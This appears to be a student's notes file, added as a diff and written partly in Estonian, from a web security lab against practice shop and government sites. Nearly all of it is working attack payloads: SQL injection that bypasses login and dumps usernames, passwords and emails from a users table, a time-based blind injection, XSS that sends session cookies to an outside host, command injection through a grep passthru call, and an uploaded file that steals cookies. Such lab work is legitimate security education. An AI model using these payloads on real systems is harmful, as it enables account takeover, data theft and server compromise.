@@ -1,0 +1,77 @@
+SQL injection
+
+LOGIN: SELECT * FROM shop_users WHERE username='$user' AND passwd= '$pass'
+U: Unavailable' # --
+P: suva
+
+SELECT * FROM shop_users WHERE username='Unavailable' # -- ' AND passwd= 'suva'
+# alustab kommentaari
+
+U:  suva
+P:  ' OR ''='
+SELECT * FROM shop_users WHERE username='suva' AND passwd= ' ' OR ''=''
+FALSE OR TRUE => TRUE
+
+
+SEARCH: SELECT id, name, description, stock, price FROM shop_items where name like '%a%' OR description like '%a%' 
+
+SQL kommentaar 
+# -- see on kommentaar
+
+a%' union select 1, TABLE_SCHEMA, TABLE_NAME, 1, 2 FROM information_schema.TABLES; # -- Kõik tabelid ja nende baas
+
+a%' union select 1, TABLE_NAME, COLUMN_NAME, 1, 2 FROM information_schema.columns; # -- kõik veerud ja nende tabel 
+
+a%' union select 1, username, password, email, id from shop_users # -- saime 2 eelneva põhjal teada mis tabel ja väljad on
+
+SELECT id, name, description, stock, price FROM shop_items where name like '%a%' union select 1, username, password, email, id from shop_users # -- saime 2 eelneva põhjal teada mis tabel ja väljad on%' OR description like '%a%' union select 1, username, password, email, id from shop_users # -- saime 2 eelneva põhjal teada mis tabel ja väljad on%' 
+
+
+BLIND sql injection: 
+a%' union select benchmark(100000000, encode('hello','goodbye')), 1, 2, 3, 4; # --
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+XSS (praegu toimib JS ainult ff-is)
+
+GOV SEARCH:
+
+<script>alert('tere');</script> 
+
+<script>i='<img src="http://minuleht.ee?'+document.cookie+'" /> ';
+document.write(i);
+</script>
+
+tekib img element:  <img src="http://minuleht.ee?PHPSESSID=4ifc2fjj9otj7kvujdjb4ruvq2">
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+SHOP SEARCH: XSS+SQL injection
+' union select '<script>alert(document.cookie);</script>', 2, 3,4, 5 # --  
+
+' union select '<script>var i="<img src=\"http://minuleht.ee?"+document.cookie+"\"/>"; document.write(i);</script>', 2, 3,4, 5 # --  
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+COMMAND EXEC:  echo passthru("grep -r -h $search * ");
+; ls -la
+; ls
+tekib käsureale:  grep -r -h ; ls *
+
+banana * ;less system.php # 
+tekib käsureale: grep -r -h banana * ;less system.php #  *
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+ANDMEOBJEKTI LIGIPÄÄS (GOV)
+
+1. lae fail üles
+2. Commandi exec-ga uuri välja kuhu läks (; ls)
+3. kuna kuvatava faili täisnimi võetakse aadressist tuleb muuta aadress kujule ?page=uploads/rynne.html
+
+
+failis oli:
+<script>
+var i= '<img src="http://minuleht.ee?'+document.cookie+'"/>';
+document.write(i);
+alert("HAHAHAHAH! HAX0RZ!!");
+</script>
+
+
+
